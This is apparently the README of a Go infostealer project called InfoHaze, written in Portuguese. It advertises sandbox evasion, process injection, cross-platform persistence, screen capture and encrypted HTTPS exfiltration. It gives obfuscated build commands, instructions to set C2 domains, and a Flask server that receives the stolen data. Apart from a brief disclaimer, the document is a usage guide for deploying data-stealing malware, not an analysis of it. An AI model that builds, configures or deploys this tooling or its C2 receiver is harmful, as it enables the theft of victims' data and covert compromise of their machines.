# InfoHaze

[![Go Reference](https://pkg.go.dev/badge/github.com/marcostolosa/infoHaze.svg)](https://pkg.go.dev/github.com/marcostolosa/infoHaze)
[![Go Report Card](https://goreportcard.com/badge/github.com/marcostolosa/infoHaze)](https://goreportcard.com/report/github.com/marcostolosa/infoHaze)

## Visão Geral
InfoHaze é um infostealer escrito em Go e mantido apenas para fins educacionais. O projeto demonstra técnicas modernas de coleta e exfiltração de dados, incluindo derivação de chave baseada em hardware, ofuscação polimórfica e persistência multiplataforma.

## Recursos
- Derivação de chave a partir do hostname e do primeiro MAC disponível.
- Detecção básica de sandbox e debugger.
- Captura de tela com compressão e criptografia.
- Injeção em processo remoto e persistência para Windows, Linux e macOS.
- Exfiltração criptografada via HTTPS (AES-GCM + zlib).

## Requisitos
- Go 1.22 ou superior.
- Inicialize o módulo e recupere as dependências:
  ```bash
  go mod init github.com/marcostolosa/infoHaze
  go mod tidy
  ```

## Compilação
### Ofuscação opcional
```bash
garble -tiny -literals -seed random build -o infoHaze.exe tika.go
```
### Build direto
```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o infoHaze.exe tika.go
```

## Uso
1. Ajuste os domínios C2 dentro do código (`tika.go`).
2. Compile o binário conforme desejado.
3. Execute o artefato em ambiente de laboratório controlado.

## Configuração do Servidor C2
- Disponibilize um endpoint HTTPS para receber os dados.
- Implemente descriptografia AES-GCM e descompressão zlib no servidor.
- Exemplo simplificado em Flask:
  ```python
  from flask import Flask, request
  app = Flask(__name__)

  @app.route('/upload', methods=['POST'])
  def upload():
      data = request.data
      # Descriptografar e descomprimir
      with open('output.bin', 'wb') as f:
          f.write(data)
      return 'OK', 200
  ```

## Aviso
Utilize este projeto apenas para pesquisa e testes autorizados. Qualquer uso indevido é ilegal e antiético, e os autores não se responsabilizam por danos causados.
